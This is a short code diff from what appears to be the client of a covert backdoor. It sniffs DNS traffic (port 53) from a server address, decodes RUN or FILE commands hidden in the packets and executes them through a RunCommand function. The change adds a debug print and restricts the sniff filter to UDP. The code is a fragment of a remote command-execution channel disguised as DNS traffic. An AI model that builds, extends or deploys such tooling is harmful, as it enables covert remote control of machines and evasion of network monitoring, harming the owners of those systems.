@@ -31,6 +31,7 @@ def parse_packet(packet):
             #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
             
             if prefix_packet == RUN or prefix_packet == FILE:
+                print("recieved response!")
                 txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
                 if prefix_packet == RUN:
                     output = RunCommand(txt_recieved)
@@ -52,7 +53,7 @@ def parse_packet(packet):
 
 def client_listen():
     print("client start listening")
-    sniff_pkt(pfilter="port 53" + " and host " + SERVER_ADR,handler=parse_packet)
+    sniff_pkt(pfilter="udp and port 53" + " and host " + SERVER_ADR,handler=parse_packet)
     
 
 if __name__=="__main__":
